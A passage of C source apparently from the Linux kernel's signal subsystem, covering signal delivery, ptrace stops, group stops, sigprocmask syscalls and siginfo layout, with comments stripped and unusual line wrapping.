SIGSEGV;\n  info.si_errno = 0;\n  info.si_code = SEGV_PKUERR;\n  info.si_addr = addr;\n  info.si_pkey = pkey;\n  return force_sig_info(&info);\n}\n#endif\n\nint force_sig_perf(void __user\n\n*addr,\nu32 type, u64\nsig_data)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = SIGTRAP;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = TRAP_PERF;\ninfo.\nsi_addr = addr;\ninfo.\nsi_perf_data = sig_data;\ninfo.\nsi_perf_type = type;\n\nreturn\nforce_sig_info(&info);\n}\n\nint force_sig_seccomp(int syscall, int reason, bool force_coredump) {\n  struct kernel_siginfo info;\n\n  clear_siginfo(&info);\n  info.si_signo = SIGSYS;\n  info.si_code = SYS_SECCOMP;\n  info.si_call_addr = (void\n  __user *)KSTK_EIP(current);\n  info.si_errno = reason;\n  info.si_arch = syscall_get_arch(current);\n  info.si_syscall = syscall;\n  return force_sig_info_to_task(&info, current,\n                                force_coredump ? HANDLER_EXIT\n                                               : HANDLER_CURRENT);\n}\n\nint force_sig_ptrace_errno_trap(int errno, void __user\n\n*addr)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = SIGTRAP;\ninfo.\nsi_errno = errno;\ninfo.\nsi_code = TRAP_HWBKPT;\ninfo.\nsi_addr = addr;\nreturn\nforce_sig_info(&info);\n}\n\nint force_sig_fault_trapno(int sig, int code, void __user\n\n*addr,\nint trapno\n)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = sig;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = code;\ninfo.\nsi_addr = addr;\ninfo.\nsi_trapno = trapno;\nreturn\nforce_sig_info(&info);\n}\n\nint send_sig_fault_trapno(int sig, int code, void __user\n\n*addr,\nint trapno,\nstruct task_struct *t\n)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = sig;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = code;\ninfo.\nsi_addr = addr;\ninfo.\nsi_trapno = trapno;\nreturn\nsend_sig_info(info\n.si_signo, &info, t);\n}\n\nint kill_pgrp(struct pid *pid, int sig, int priv) {\n  int ret;\n\n  read_lock(&tasklist_lock);\n  ret = __kill_pgrp_info(sig, __si_special(priv), pid);\n  read_unlock(&tasklist_lock);\n\n  return ret;\n}\n\nEXPORT_SYMBOL(kill_pgrp);\n\nint kill_pid(struct pid *pid, int sig, int priv) {\n  return kill_pid_info(sig, __si_special(priv), pid);\n}\n\nEXPORT_SYMBOL(kill_pid);\n\nstruct sigqueue *sigqueue_alloc(void) {\n  return __sigqueue_alloc(-1, current, GFP_KERNEL, 0, SIGQUEUE_PREALLOC);\n}\n\nvoid sigqueue_free(struct sigqueue *q) {\n  unsigned long flags;\n  spinlock_t *lock = &current->sighand->siglock;\n\n  BUG_ON(!(q->flags & SIGQUEUE_PREALLOC));\n\n  spin_lock_irqsave(lock, flags);\n  q->flags &= ~SIGQUEUE_PREALLOC;\n\n  if (!list_empty(&q->list))\n    q = NULL;\n  spin_unlock_irqrestore(lock, flags);\n\n  if (q)\n    __sigqueue_free(q);\n}\n\nint send_sigqueue(struct sigqueue *q, struct pid *pid, enum pid_type type) {\n  int sig = q->info.si_signo;\n  struct sigpending *pending;\n  struct task_struct *t;\n  unsigned long flags;\n  int ret, result;\n\n  BUG_ON(!(q->flags & SIGQUEUE_PREALLOC));\n\n  ret = -1;\n  rcu_read_lock();\n  t = pid_task(pid, type);\n  if (!t || !likely(lock_task_sighand(t, &flags)))\n    goto ret;\n\n  ret = 1;\n  result = TRACE_SIGNAL_IGNORED;\n  if (!prepare_signal(sig, t, false))\n    goto out;\n\n  ret = 0;\n  if (unlikely(!list_empty(&q->list))) {\n    BUG_ON(q->info.si_code != SI_TIMER);\n    q->info.si_overrun++;\n    result = TRACE_SIGNAL_ALREADY_PENDING;\n    goto out;\n  }\n  q->info.si_overrun = 0;\n\n  signalfd_notify(t, sig);\n  pending = (type != PIDTYPE_PID) ? &t->signal->shared_pending : &t->pending;\n  list_add_tail(&q->list, &pending->list);\n  sigaddset(&pending->signal, sig);\n  complete_signal(sig, t, type);\n  result = TRACE_SIGNAL_DELIVERED;\n  out:\n  trace_signal_generate(sig, &q->info, t, type != PIDTYPE_PID, result);\n  unlock_task_sighand(t, &flags);\n  ret:\n  rcu_read_unlock();\n  return ret;\n}\n\nstatic void do_notify_pidfd(struct task_struct *task) {\n  struct pid *pid;\n\n  WARN_ON(task->exit_state == 0);\n  pid = task_pid(task);\n  wake_up_all(&pid->wait_pidfd);\n}\n\nbool do_notify_parent(struct task_struct *tsk, int sig) {\n  struct kernel_siginfo info;\n  unsigned long flags;\n  struct sighand_struct *psig;\n  bool autoreap = false;\n  u64 utime, stime;\n\n  BUG_ON(sig == -1);\n\n  BUG_ON(task_is_stopped_or_traced(tsk));\n\n  BUG_ON(!tsk->ptrace &&\n         (tsk->group_leader != tsk || !thread_group_empty(tsk)));\n\n  do_notify_pidfd(tsk);\n\n  if (sig != SIGCHLD) {\n\n    if (tsk->parent_exec_id != READ_ONCE(tsk->parent->self_exec_id))\n      sig = SIGCHLD;\n  }\n\n  clear_siginfo(&info);\n  info.si_signo = sig;\n  info.si_errno = 0;\n  rcu_read_lock();\n  info.si_pid = task_pid_nr_ns(tsk, task_active_pid_ns(tsk->parent));\n  info.si_uid = from_kuid_munged(task_cred_xxx(tsk->parent, user_ns),\n                                 task_uid(tsk));\n  rcu_read_unlock();\n\n  task_cputime(tsk, &utime, &stime);\n  info.si_utime = nsec_to_clock_t(utime + tsk->signal->utime);\n  info.si_stime = nsec_to_clock_t(stime + tsk->signal->stime);\n\n  info.si_status = tsk->exit_code & 0x7f;\n  if (tsk->exit_code & 0x80)\n    info.si_code = CLD_DUMPED;\n  else if (tsk->exit_code & 0x7f)\n    info.si_code = CLD_KILLED;\n  else {\n    info.si_code = CLD_EXITED;\n    info.si_status = tsk->exit_code >> 8;\n  }\n\n  psig = tsk->parent->sighand;\n  spin_lock_irqsave(&psig->siglock, flags);\n  if (!tsk->ptrace && sig == SIGCHLD &&\n      (psig->action[SIGCHLD - 1].sa.sa_handler == SIG_IGN ||\n       (psig->action[SIGCHLD - 1].sa.sa_flags & SA_NOCLDWAIT))) {\n    autoreap = true;\n    if (psig->action[SIGCHLD - 1].sa.sa_handler == SIG_IGN)\n      sig = 0;\n  }\n  if (valid_signal(sig) && sig)\n    __send_signal(sig, &info, tsk->parent, PIDTYPE_TGID, false);\n  __wake_up_parent(tsk, tsk->parent);\n  spin_unlock_irqrestore(&psig->siglock, flags);\n\n  return autoreap;\n}\n\nstatic void do_notify_parent_cldstop(struct task_struct *tsk,\n                                     bool for_ptracer, int why) {\n  struct kernel_siginfo info;\n  unsigned long flags;\n  struct task_struct *parent;\n  struct sighand_struct *sighand;\n  u64 utime, stime;\n\n  if (for_ptracer) {\n    parent = tsk->parent;\n  } else {\n    tsk = tsk->group_leader;\n    parent = tsk->real_parent;\n  }\n\n  clear_siginfo(&info);\n  info.si_signo = SIGCHLD;\n  info.si_errno = 0;\n\n  rcu_read_lock();\n  info.si_pid = task_pid_nr_ns(tsk, task_active_pid_ns(parent));\n  info.si_uid = from_kuid_munged(task_cred_xxx(parent, user_ns), task_uid(tsk));\n  rcu_read_unlock();\n\n  task_cputime(tsk, &utime, &stime);\n  info.si_utime = nsec_to_clock_t(utime);\n  info.si_stime = nsec_to_clock_t(stime);\n\n  info.si_code = why;\n  switch (why) {\n    case CLD_CONTINUED:\n      info.si_status = SIGCONT;\n      break;\n    case CLD_STOPPED:\n      info.si_status = tsk->signal->group_exit_code & 0x7f;\n      break;\n    case CLD_TRAPPED:\n      info.si_status = tsk->exit_code & 0x7f;\n      break;\n    default:\n      BUG();\n  }\n\n  sighand = parent->sighand;\n  spin_lock_irqsave(&sighand->siglock, flags);\n  if (sighand->action[SIGCHLD - 1].sa.sa_handler != SIG_IGN &&\n      !(sighand->action[SIGCHLD - 1].sa.sa_flags & SA_NOCLDSTOP))\n    __group_send_sig_info(SIGCHLD, &info, parent);\n\n  __wake_up_parent(tsk, parent);\n  spin_unlock_irqrestore(&sighand->siglock, flags);\n}\n\nstatic void\nptrace_stop(int exit_code, int why, int clear_code, kernel_siginfo_t *info)\n\n__releases(&current\n->sighand->siglock)\n__acquires(&current\n->sighand->siglock)\n{\nbool gstop_done = false;\n\nif (\n\narch_ptrace_stop_needed()\n\n) {\n\nspin_unlock_irq(&current\n->sighand->siglock);\n\narch_ptrace_stop();\n\nspin_lock_irq(&current\n->sighand->siglock);\n}\nset_special_state(TASK_TRACED);\n\nsmp_wmb();\n\ncurrent->\nlast_siginfo = info;\ncurrent->\nexit_code = exit_code;\n\nif (why ==\nCLD_STOPPED &&(current\n->\njobctl &JOBCTL_STOP_PENDING\n))\ngstop_done = task_participate_group_stop(current);\n\ntask_clear_jobctl_pending(current, JOBCTL_TRAP_STOP\n);\nif (\ninfo &&info\n->si_code >> 8 == PTRACE_EVENT_STOP)\ntask_clear_jobctl_pending(current, JOBCTL_TRAP_NOTIFY\n);\n\ntask_clear_jobctl_trapping(current);\n\nspin_unlock_irq(&current\n->sighand->siglock);\nread_lock(&tasklist_lock);\nif (\nlikely(current\n->ptrace)) {\n\ndo_notify_parent_cldstop(current,\ntrue, why);\nif (\ngstop_done &&ptrace_reparented(current)\n)\ndo_notify_parent_cldstop(current,\nfalse, why);\n\npreempt_disable();\n\nread_unlock(&tasklist_lock);\n\ncgroup_enter_frozen();\n\npreempt_enable_no_resched();\n\nfreezable_schedule();\n\ncgroup_leave_frozen(true);\n} else {\n\nif (gstop_done)\ndo_notify_parent_cldstop(current,\nfalse, why);\n\n__set_current_state(TASK_RUNNING);\nif (clear_code)\ncurrent->\nexit_code = 0;\nread_unlock(&tasklist_lock);\n}\n\nspin_lock_irq(&current\n->sighand->siglock);\ncurrent->\nlast_siginfo = NULL;\n\ncurrent->jobctl &= ~\nJOBCTL_LISTENING;\n\nrecalc_sigpending_tsk(current);\n}\n\nstatic void ptrace_do_notify(int signr, int exit_code, int why) {\n  kernel_siginfo_t info;\n\n  clear_siginfo(&info);\n  info.si_signo = signr;\n  info.si_code = exit_code;\n  info.si_pid = task_pid_vnr(current);\n  info.si_uid = from_kuid_munged(current_user_ns(), current_uid());\n\n  ptrace_stop(exit_code, why, 1, &info);\n}\n\nvoid ptrace_notify(int exit_code) {\n  BUG_ON((exit_code & (0x7f | ~0xffff)) != SIGTRAP);\n  if (unlikely(current->task_works))\n    task_work_run();\n\n  spin_lock_irq(&current->sighand->siglock);\n  ptrace_do_notify(SIGTRAP, exit_code, CLD_TRAPPED);\n  spin_unlock_irq(&current->sighand->siglock);\n}\n\nstatic bool do_signal_stop(int signr)\n\n__releases(&current\n->sighand->siglock)\n{\nstruct signal_struct *sig = current->signal;\n\nif (!(current->\njobctl &JOBCTL_STOP_PENDING\n)) {\nunsigned long gstop = JOBCTL_STOP_PENDING | JOBCTL_STOP_CONSUME;\nstruct task_struct *t;\n\nWARN_ON_ONCE(signr\n& ~JOBCTL_STOP_SIGMASK);\n\nif (!\nlikely(current\n->\njobctl &JOBCTL_STOP_DEQUEUED\n) ||\nunlikely(sig\n->\nflags &SIGNAL_GROUP_EXIT\n) ||\nunlikely(sig\n->group_exec_task))\nreturn false;\n\nif (!(sig->\nflags &SIGNAL_STOP_STOPPED\n))\nsig->\ngroup_exit_code = signr;\n\nsig->\ngroup_stop_count = 0;\n\nif (\ntask_set_jobctl_pending(current, signr\n| gstop))\nsig->group_stop_count++;\n\nt = current;\nwhile_each_thread(current, t\n) {\n\nif (!\ntask_is_stopped(t)\n&&\ntask_set_jobctl_pending(t, signr\n| gstop)) {\nsig->group_stop_count++;\nif (likely(!(t->\nptrace &PT_SEIZED\n)))\nsignal_wake_up(t,\n0);\nelse\nptrace_trap_notify(t);\n}\n}\n}\n\nif (likely(!current->ptrace)) {\nint notify = 0;\n\nif (\ntask_participate_group_stop(current)\n)\nnotify = CLD_STOPPED;\n\nset_special_state(TASK_STOPPED);\nspin_unlock_irq(&current\n->sighand->siglock);\n\n\nif (notify) {\nread_lock(&tasklist_lock);\ndo_notify_parent_cldstop(current,\nfalse, notify);\nread_unlock(&tasklist_lock);\n}\n\ncgroup_enter_frozen();\n\nfreezable_schedule();\n\nreturn true;\n} else {\n\ntask_set_jobctl_pending(current, JOBCTL_TRAP_STOP\n);\nreturn false;\n}\n}\n\nstatic void do_jobctl_trap(void) {\n  struct signal_struct *signal = current->signal;\n  int signr = current->jobctl & JOBCTL_STOP_SIGMASK;\n\n  if (current->ptrace & PT_SEIZED) {\n    if (!signal->group_stop_count &&\n        !(signal->flags & SIGNAL_STOP_STOPPED))\n      signr = SIGTRAP;\n    WARN_ON_ONCE(!signr);\n    ptrace_do_notify(signr, signr | (PTRACE_EVENT_STOP << 8),\n                     CLD_STOPPED);\n  } else {\n    WARN_ON_ONCE(!signr);\n    ptrace_stop(signr, CLD_STOPPED, 0, NULL);\n    current->exit_code = 0;\n  }\n}\n\nstatic void do_freezer_trap(void)\n\n__releases(&current\n->sighand->siglock)\n{\n\nif ((current->\njobctl &(JOBCTL_PENDING_MASK\n| JOBCTL_TRAP_FREEZE)) !=\nJOBCTL_TRAP_FREEZE) {\nspin_unlock_irq(&current\n->sighand->siglock);\nreturn;\n}\n\n__set_current_state(TASK_INTERRUPTIBLE);\nclear_thread_flag(TIF_SIGPENDING);\nspin_unlock_irq(&current\n->sighand->siglock);\n\ncgroup_enter_frozen();\n\nfreezable_schedule();\n\n}\n\nstatic int\nptrace_signal(int signr, kernel_siginfo_t *info, enum pid_type type) {\n\n  current->jobctl |= JOBCTL_STOP_DEQUEUED;\n  ptrace_stop(signr, CLD_TRAPPED, 0, info);\n\n  signr = current->exit_code;\n  if (signr == 0)\n    return signr;\n\n  current->exit_code = 0;\n\n  if (signr != info->si_signo) {\n    clear_siginfo(info);\n    info->si_signo = signr;\n    info->si_errno = 0;\n    info->si_code = SI_USER;\n    rcu_read_lock();\n    info->si_pid = task_pid_vnr(current->parent);\n    info->si_uid = from_kuid_munged(current_user_ns(),\n                                    task_uid(current->parent));\n    rcu_read_unlock();\n  }\n\n  if (sigismember(&current->blocked, signr) ||\n      fatal_signal_pending(current)) {\n    send_signal(signr, info, current, type);\n    signr = 0;\n  }\n\n  return signr;\n}\n\nstatic void hide_si_addr_tag_bits(struct ksignal *ksig) {\n  switch (siginfo_layout(ksig->sig, ksig->info.si_code)) {\n    case SIL_FAULT:\n    case SIL_FAULT_TRAPNO:\n    case SIL_FAULT_MCEERR:\n    case SIL_FAULT_BNDERR:\n    case SIL_FAULT_PKUERR:\n    case SIL_FAULT_PERF_EVENT:\n      ksig->info.si_addr = arch_untagged_si_addr(\n          ksig->info.si_addr, ksig->sig, ksig->info.si_code);\n      break;\n    case SIL_KILL:\n    case SIL_TIMER:\n    case SIL_POLL:\n    case SIL_CHLD:\n    case SIL_RT:\n    case SIL_SYS:\n      break;\n  }\n}\n\nbool get_signal(struct ksignal *ksig) {\n  struct sighand_struct *sighand = current->sighand;\n  struct signal_struct *signal = current->signal;\n  int signr;\n\n  if (unlikely(current->task_works))\n    task_work_run();\n\n  if (!IS_ENABLED(CONFIG_GENERIC_ENTRY)) {\n    if (test_thread_flag(TIF_NOTIFY_SIGNAL))\n      tracehook_notify_signal();\n    if (!task_sigpending(current))\n      return false;\n  }\n\n  if (unlikely(uprobe_deny_signal()))\n    return false;\n\n  try_to_freeze();\n\n  relock:\n  spin_lock_irq(&sighand->siglock);\n\n  if (unlikely(signal->flags & SIGNAL_CLD_MASK)) {\n    int why;\n\n    if (signal->flags & SIGNAL_CLD_CONTINUED)\n      why = CLD_CONTINUED;\n    else\n      why = CLD_STOPPED;\n\n    signal->flags &= ~SIGNAL_CLD_MASK;\n\n    spin_unlock_irq(&sighand->siglock);\n\n    read_lock(&tasklist_lock);\n    do_notify_parent_cldstop(current, false, why);\n\n    if (ptrace_reparented(current->group_leader))\n      do_notify_parent_cldstop(current->group_leader,\n                               true, why);\n    read_unlock(&tasklist_lock);\n\n    goto relock;\n  }\n\n  for (;;) {\n    struct k_sigaction *ka;\n    enum pid_type type;\n\n    if ((signal->flags & SIGNAL_GROUP_EXIT) ||\n        signal->group_exec_task) {\n      ksig->info.si_signo = signr = SIGKILL;\n      sigdelset(&current->pending.signal, SIGKILL);\n      trace_signal_deliver(SIGKILL, SEND_SIG_NOINFO,\n                           &sighand->action[SIGKILL - 1]);\n      recalc_sigpending();\n      goto fatal;\n    }\n\n    if (unlikely(current->jobctl & JOBCTL_STOP_PENDING) &&\n        do_signal_stop(0))\n      goto relock;\n\n    if (unlikely(current->jobctl &\n                 (JOBCTL_TRAP_MASK | JOBCTL_TRAP_FREEZE))) {\n      if (current->jobctl & JOBCTL_TRAP_MASK) {\n        do_jobctl_trap();\n        spin_unlock_irq(&sighand->siglock);\n      } else if (current->jobctl & JOBCTL_TRAP_FREEZE)\n        do_freezer_trap();\n\n      goto relock;\n    }\n\n    if (unlikely(cgroup_task_frozen(current))) {\n      spin_unlock_irq(&sighand->siglock);\n      cgroup_leave_frozen(false);\n      goto relock;\n    }\n\n    type = PIDTYPE_PID;\n    signr = dequeue_synchronous_signal(&ksig->info);\n    if (!signr)\n      signr = dequeue_signal(current, &current->blocked,\n                             &ksig->info, &type);\n\n    if (!signr)\n      break;\n\n    if (unlikely(current->ptrace) && (signr != SIGKILL) &&\n        !(sighand->action[signr - 1].sa.sa_flags & SA_IMMUTABLE)) {\n      signr = ptrace_signal(signr, &ksig->info, type);\n      if (!signr)\n        continue;\n    }\n\n    ka = &sighand->action[signr - 1];\n\n    trace_signal_deliver(signr, &ksig->info, ka);\n\n    if (ka->sa.sa_handler == SIG_IGN)\n      continue;\n    if (ka->sa.sa_handler != SIG_DFL) {\n\n      ksig->ka = *ka;\n\n      if (ka->sa.sa_flags & SA_ONESHOT)\n        ka->sa.sa_handler = SIG_DFL;\n\n      break;\n    }\n\n    if (sig_kernel_ignore(signr))\n      continue;\n\n    if (unlikely(signal->flags & SIGNAL_UNKILLABLE) &&\n        !sig_kernel_only(signr))\n      continue;\n\n    if (sig_kernel_stop(signr)) {\n\n      if (signr != SIGSTOP) {\n        spin_unlock_irq(&sighand->siglock);\n\n        if (is_current_pgrp_orphaned())\n          goto relock;\n\n        spin_lock_irq(&sighand->siglock);\n      }\n\n      if (likely(do_signal_stop(ksig->info.si_signo))) {\n\n        goto relock;\n      }\n\n      continue;\n    }\n\n    fatal:\n    spin_unlock_irq(&sighand->siglock);\n    if (unlikely(cgroup_task_frozen(current)))\n      cgroup_leave_frozen(true);\n\n    current->flags |= PF_SIGNALED;\n\n    if (sig_kernel_coredump(signr)) {\n      if (print_fatal_signals)\n        print_fatal_signal(ksig->info.si_signo);\n      proc_coredump_connector(current);\n\n      do_coredump(&ksig->info);\n    }\n\n    if (current->flags & PF_IO_WORKER)\n      goto out;\n\n    do_group_exit(ksig->info.si_signo);\n\n  }\n  spin_unlock_irq(&sighand->siglock);\n  out:\n  ksig->sig = signr;\n\n  if (!(ksig->ka.sa.sa_flags & SA_EXPOSE_TAGBITS))\n    hide_si_addr_tag_bits(ksig);\n\n  return ksig->sig > 0;\n}\n\nstatic void signal_delivered(struct ksignal *ksig, int stepping) {\n  sigset_t blocked;\n\n  clear_restore_sigmask();\n\n  sigorsets(&blocked, &current->blocked, &ksig->ka.sa.sa_mask);\n  if (!(ksig->ka.sa.sa_flags & SA_NODEFER))\n    sigaddset(&blocked, ksig->sig);\n  set_current_blocked(&blocked);\n  if (current->sas_ss_flags & SS_AUTODISARM)\n    sas_ss_reset(current);\n  tracehook_signal_handler(stepping);\n}\n\nvoid signal_setup_done(int failed, struct ksignal *ksig, int stepping) {\n  if (failed)\n    force_sigsegv(ksig->sig);\n  else\n    signal_delivered(ksig, stepping);\n}\n\nstatic void retarget_shared_pending(struct task_struct *tsk, sigset_t *which) {\n  sigset_t retarget;\n  struct task_struct *t;\n\n  sigandsets(&retarget, &tsk->signal->shared_pending.signal, which);\n  if (sigisemptyset(&retarget))\n    return;\n\n  t = tsk;\n  while_each_thread(tsk, t)\n  {\n    if (t->flags & PF_EXITING)\n      continue;\n\n    if (!has_pending_signals(&retarget, &t->blocked))\n      continue;\n\n    sigandsets(&retarget, &retarget, &t->blocked);\n\n    if (!task_sigpending(t))\n      signal_wake_up(t, 0);\n\n    if (sigisemptyset(&retarget))\n      break;\n  }\n}\n\nvoid exit_signals(struct task_struct *tsk) {\n  int group_stop = 0;\n  sigset_t unblocked;\n\n  cgroup_threadgroup_change_begin(tsk);\n\n  if (thread_group_empty(tsk) || (tsk->signal->flags & SIGNAL_GROUP_EXIT)) {\n    tsk->flags |= PF_EXITING;\n    cgroup_threadgroup_change_end(tsk);\n    return;\n  }\n\n  spin_lock_irq(&tsk->sighand->siglock);\n\n  tsk->flags |= PF_EXITING;\n\n  cgroup_threadgroup_change_end(tsk);\n\n  if (!task_sigpending(tsk))\n    goto out;\n\n  unblocked = tsk->blocked;\n  signotset(&unblocked);\n  retarget_shared_pending(tsk, &unblocked);\n\n  if (unlikely(tsk->jobctl & JOBCTL_STOP_PENDING) &&\n      task_participate_group_stop(tsk))\n    group_stop = CLD_STOPPED;\n  out:\n  spin_unlock_irq(&tsk->sighand->siglock);\n\n  if (unlikely(group_stop)) {\n    read_lock(&tasklist_lock);\n    do_notify_parent_cldstop(tsk, false, group_stop);\n    read_unlock(&tasklist_lock);\n  }\n}\n\nSYSCALL_DEFINE0(restart_syscall)\n    {\n        struct restart_block *restart = &current->restart_block;\n        return restart->fn(restart);\n    }\n\nlong do_no_restart_syscall(struct restart_block *param) {\n  return -EINTR;\n}\n\nstatic void\n__set_task_blocked(struct task_struct *tsk, const sigset_t *newset) {\n  if (task_sigpending(tsk) && !thread_group_empty(tsk)) {\n    sigset_t newblocked;\n\n    sigandnsets(&newblocked, newset, &current->blocked);\n    retarget_shared_pending(tsk, &newblocked);\n  }\n  tsk->blocked = *newset;\n  recalc_sigpending();\n}\n\nvoid set_current_blocked(sigset_t *newset) {\n  sigdelsetmask(newset, sigmask(SIGKILL) | sigmask(SIGSTOP));\n  __set_current_blocked(newset);\n}\n\nvoid __set_current_blocked(const sigset_t *newset) {\n  struct task_struct *tsk = current;\n\n  if (sigequalsets(&tsk->blocked, newset))\n    return;\n\n  spin_lock_irq(&tsk->sighand->siglock);\n  __set_task_blocked(tsk, newset);\n  spin_unlock_irq(&tsk->sighand->siglock);\n}\n\nint sigprocmask(int how, sigset_t *set, sigset_t *oldset) {\n  struct task_struct *tsk = current;\n  sigset_t newset;\n\n  if (oldset)\n    *oldset = tsk->blocked;\n\n  switch (how) {\n    case SIG_BLOCK:\n      sigorsets(&newset, &tsk->blocked, set);\n      break;\n    case SIG_UNBLOCK:\n      sigandnsets(&newset, &tsk->blocked, set);\n      break;\n    case SIG_SETMASK:\n      newset = *set;\n      break;\n    default:\n      return -EINVAL;\n  }\n\n  __set_current_blocked(&newset);\n  return 0;\n}\n\nEXPORT_SYMBOL(sigprocmask);\n\nint set_user_sigmask(const sigset_t __user\n\n*umask,\nsize_t sigsetsize\n)\n{\nsigset_t kmask;\n\nif (!umask)\nreturn 0;\nif (sigsetsize != sizeof(sigset_t))\nreturn -\nEINVAL;\nif (\ncopy_from_user(&kmask, umask,\nsizeof(sigset_t)))\nreturn -\nEFAULT;\n\nset_restore_sigmask();\n\ncurrent->\nsaved_sigmask = current->blocked;\nset_current_blocked(&kmask);\n\nreturn 0;\n}\n\n#ifdef CONFIG_COMPAT\nint set_compat_user_sigmask(const compat_sigset_t __user *umask,\n          size_t sigsetsize)\n{\n  sigset_t kmask;\n\n  if (!umask)\n    return 0;\n  if (sigsetsize != sizeof(compat_sigset_t))\n    return -EINVAL;\n  if (get_compat_sigset(&kmask, umask))\n    return -EFAULT;\n\n  set_restore_sigmask();\n  current->saved_sigmask = current->blocked;\n  set_current_blocked(&kmask);\n\n  return 0;\n}\n#endif\n\nSYSCALL_DEFINE4(rt_sigprocmask,\nint, how,\nsigset_t __user\n*, nset,\nsigset_t __user\n*, oset, size_t, sigsetsize)\n{\nsigset_t old_set, new_set;\nint error;\n\nif (sigsetsize != sizeof(sigset_t))\nreturn -\nEINVAL;\n\nold_set = current->blocked;\n\nif (nset) {\nif (\ncopy_from_user(&new_set, nset,\nsizeof(sigset_t)))\nreturn -\nEFAULT;\nsigdelsetmask(&new_set, sigmask(SIGKILL)\n|\nsigmask(SIGSTOP)\n);\n\nerror = sigprocmask(how, &new_set, NULL);\nif (error)\nreturn\nerror;\n}\n\nif (oset) {\nif (\ncopy_to_user(oset, &old_set,\nsizeof(sigset_t)))\nreturn -\nEFAULT;\n}\n\nreturn 0;\n}\n\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE4(rt_sigprocmask, int, how, compat_sigset_t __user *, nset,\n    compat_sigset_t __user *, oset, compat_size_t, sigsetsize)\n{\n  sigset_t old_set = current->blocked;\n\n\n  if (sigsetsize != sizeof(sigset_t))\n    return -EINVAL;\n\n  if (nset) {\n    sigset_t new_set;\n    int error;\n    if (get_compat_sigset(&new_set, nset))\n      return -EFAULT;\n    sigdelsetmask(&new_set, sigmask(SIGKILL)|sigmask(SIGSTOP));\n\n    error = sigprocmask(how, &new_set, NULL);\n    if (error)\n      return error;\n  }\n  return oset ? put_compat_sigset(oset, &old_set, sizeof(*oset)) : 0;\n}\n#endif\n\nstatic void do_sigpending(sigset_t *set) {\n  spin_lock_irq(&current->sighand->siglock);\n  sigorsets(set, &current->pending.signal,\n            &current->signal->shared_pending.signal);\n  spin_unlock_irq(&current->sighand->siglock);\n\n  sigandsets(set, &current->blocked, set);\n}\n\nSYSCALL_DEFINE2(rt_sigpending, sigset_t\n__user *, uset, size_t, sigsetsize)\n{\nsigset_t set;\n\nif (sigsetsize > sizeof(*uset))\nreturn -\nEINVAL;\n\ndo_sigpending(&set);\n\nif (\ncopy_to_user(uset, &set, sigsetsize\n))\nreturn -\nEFAULT;\n\nreturn 0;\n}\n\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE2(rt_sigpending, compat_sigset_t __user *, uset,\n    compat_size_t, sigsetsize)\n{\n  sigset_t set;\n\n  if (sigsetsize > sizeof(*uset))\n    return -EINVAL;\n\n  do_sigpending(&set);\n\n  return put_compat_sigset(uset, &set, sigsetsize);\n}\n#endif\n\nstatic const struct {\n  unsigned char limit, layout;\n} sig_sicodes[] = {\n    [SIGILL] = {NSIGILL, SIL_FAULT},\n    [SIGFPE] = {NSIGFPE, SIL_FAULT},\n    [SIGSEGV] = {NSIGSEGV, SIL_FAULT},\n    [SIGBUS] = {NSIGBUS, SIL_FAULT},\n    [SIGTRAP] = {NSIGTRAP, SIL_FAULT},\n#if defined(SIGEMT)\n    [SIGEMT] = { NSIGEMT, SIL_FAULT },\n#endif\n    [SIGCHLD] = {NSIGCHLD, SIL_CHLD},\n    [SIGPOLL] = {NSIGPOLL, SIL_POLL},\n    [SIGSYS] = {NSIGSYS, SIL_SYS},\n};\n\nstatic bool known_siginfo_layout(unsigned sig, int si_code) {\n  if (si_code == SI_KERNEL)\n    return true;\n  else if ((si_code > SI_USER)) {\n    if (sig_specific_sicodes(sig)) {\n      if (si_code <= sig_sicodes[sig].limit)\n        return true;\n    } else if (si_code <= NSIGPOLL)\n      return true;\n  } else if (si_code >= SI_DETHREAD)\n    return true;\n  else if (si_code == SI_ASYNCNL)\n    return true;\n  return false;\n}\n\nenum siginfo_layout siginfo_layout(unsigned sig, int si_code) {\n  enum siginfo_layout layout = SIL_KILL;\n  if ((si_code > SI_USER) && (si_code < SI_KERNEL)) {\n    if ((sig < ARRAY_SIZE(sig_sicodes)) &&\n        (si_code <= sig_sicodes[sig].limit)) {\n      layout = sig_sicodes[sig].layout;\n\n      if ((sig == SIGBUS) &&\n          (si_code >= BUS_MCEERR_AR) && (si_code <= BUS_MCEERR_AO))\n        layout = SIL_FAULT_MCEERR;\n      else if ((sig == SIGSEGV) && (si_code == SEGV_BNDERR))\n        layout = SIL_FAULT_BNDERR;\n#ifdef SEGV_PKUERR\n        else if ((sig == SIGSEGV) && (si_code == SEGV_PKUERR))\n          layout = SIL_FAULT_PKUERR;\n#endif\n      else if ((sig == SIGTRAP) && (si_code == TRAP_PERF))\n        layout = SIL_FAULT_PERF_EVENT;\n      else if (IS_ENABLED(CONFIG_SPARC) &&\n               (sig == SIGILL) && (si_code == ILL_ILLTRP))\n        layout = SIL_FAULT_TRAPNO;\n      else if (IS_ENABLED(CONFIG_ALPHA) &&\n               ((sig == SIGFPE) ||\n                ((sig == SIGTRAP) && (si_code == TRAP_UNK))))\n        layout = SIL_FAULT_TRAPNO;\n    } else if (si_code <= NSIGPOLL)\n      layout = SIL_POLL;\n  } else {\n    if (si_code == SI_TIMER)\n      layout = SIL_TIMER;\n    else if (si_code == SI_SIGIO)\n      layout = SIL_POLL;\n    else if (si_code < 0)\n      layout = SIL_RT;\n  }\n  return layout;\n}\n\nstatic inline char __user\n*\n\nsi_expansion(const siginfo_t __user\n\n*info)\n{\nreturn ((\nchar __user\n*)info) + sizeof(struct kernel_siginfo);\n}\n\nint copy_siginfo_to_user(siginfo_t __user\n\n*to,\nconst kernel_siginfo_t *from\n)\n{\nchar __user\n*\nexpansion = si_expansion(to);\nif (\ncopy_to_user(to, from,\nsizeof(struct kernel_siginfo)))\nreturn -\nEFAULT;\nif (\nclear_user(expansion, SI_EXPANSION_SIZE\n))\nreturn -\nEFAULT;\nreturn 0;\n}\n\nstatic int post_copy_siginfo_from_user(kernel_siginfo_t 